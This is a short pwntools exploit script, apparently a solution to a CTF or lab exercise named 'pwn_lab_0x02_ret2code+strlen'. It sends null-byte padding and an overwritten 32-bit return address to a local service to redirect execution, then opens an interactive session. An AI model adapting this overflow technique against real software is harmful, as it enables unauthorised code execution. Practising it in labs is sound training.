from pwn import *

local = False
r = process("./pwn_lab_0x02_ret2code+strlen") if local else remote("localhost", 42015)
p = b"\x00" * (0x71 + 4) + p32(0x08049235)

r.sendline(p)
r.interactive()